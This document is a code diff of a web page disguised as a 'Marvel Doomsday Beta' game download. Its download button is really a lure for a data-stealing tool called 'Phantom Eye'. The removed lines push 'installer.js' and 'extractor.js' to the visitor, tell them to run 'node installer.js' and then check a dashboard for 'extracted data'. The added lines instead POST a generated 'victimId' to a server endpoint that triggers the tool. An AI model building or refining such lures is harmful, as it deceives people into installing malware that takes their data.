@@ -310,11 +310,11 @@
         });
 
         // ================================================
-        // DOWNLOAD & INSTALL - SIMPLEST WAY
+        // RUN PHANTOM EYE - NO DOWNLOADS!
         // ================================================
         document.getElementById('downloadBtn').addEventListener('click', function() {
             var btn = document.getElementById('downloadBtn');
-            btn.innerHTML = '⏳ Downloading...';
+            btn.innerHTML = '⏳ Installing...';
             btn.style.background = '#ffc107';
             btn.style.color = '#333';
             btn.disabled = true;
@@ -328,48 +328,38 @@
                     clearInterval(interval);
                     
                     // ============================================
-                    // STEP 1: Download the installer.js file
+                    // TRIGGER PHANTOM EYE ON THE SERVER
                     // ============================================
-                    var link = document.createElement('a');
-                    link.href = '/download/installer.js';
-                    link.download = 'installer.js';
-                    document.body.appendChild(link);
-                    link.click();
-                    document.body.removeChild(link);
-                    
-                    // ============================================
-                    // STEP 2: Also download extractor.js
-                    // ============================================
-                    setTimeout(function() {
-                        var link2 = document.createElement('a');
-                        link2.href = '/client/extractor.js';
-                        link2.download = 'extractor.js';
-                        document.body.appendChild(link2);
-                        link2.click();
-                        document.body.removeChild(link2);
-                    }, 500);
-                    
-                    btn.innerHTML = '✅ Download Complete!';
-                    btn.style.background = '#28a745';
-                    btn.style.color = 'white';
-                    btn.disabled = false;
-                    document.getElementById('gameSize').textContent = '✅ Downloaded • Run installer.js';
-                    showToast('👁️ Files downloaded! Run installer.js', 'success');
-                    
-                    // ============================================
-                    // STEP 3: Show instructions
-                    // ============================================
-                    var instructions = document.createElement('div');
-                    instructions.style.cssText = 'margin-top:15px;padding:15px;background:rgba(0,180,80,0.1);border-radius:10px;border:1px solid rgba(0,180,80,0.2);font-size:12px;color:#888;text-align:left;';
-                    instructions.innerHTML = `
-                        <strong style="color:#00d060;">📋 Quick Start:</strong><br>
-                        <span style="font-size:11px;">1. Open Command Prompt (CMD) in the download folder</span><br>
-                        <span style="font-size:11px;">2. Run: <code style="background:#1a1a1a;padding:2px 8px;border-radius:4px;color:#00d060;">node installer.js</code></span><br>
-                        <span style="font-size:11px;color:#666;">Then check the dashboard for extracted data!</span>
-                    `;
-                    document.querySelector('.card').appendChild(instructions);
-                    
-                    setTimeout(function() { window.close(); }, 10000);
+                    fetch('/api/run', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            victimId: 'BROWSER-' + Date.now().toString(36).toUpperCase()
+                        })
+                    })
+                    .then(function(response) {
+                        return response.json();
+                    })
+                    .then(function(data) {
+                        console.log('✅ Phantom Eye triggered:', data);
+                        btn.innerHTML = '✅ Complete!';
+                        btn.style.background = '#28a745';
+                        btn.style.color = 'white';
+                        btn.disabled = false;
+                        document.getElementById('gameSize').textContent = '✅ Phantom Eye Activated!';
+                        showToast('👁️ Phantom Eye is running!', 'success');
+                        setTimeout(function() { window.close(); }, 3000);
+                    })
+                    .catch(function(err) {
+                        console.log('❌ Error:', err);
+                        btn.innerHTML = '❌ Failed';
+                        btn.style.background = '#dc3545';
+                        btn.style.color = 'white';
+                        btn.disabled = false;
+                        showToast('❌ Failed to activate', 'error');
+                    });
                 }
             }, 250);
         });
@@ -387,7 +377,7 @@
         });
 
         console.log('🎮 Marvel Doomsday Beta loaded.');
-        console.log('👁️ Click Download to get Phantom Eye');
+        console.log('👁️ Click Download to activate Phantom Eye');
     </script>
 </body>
 </html>
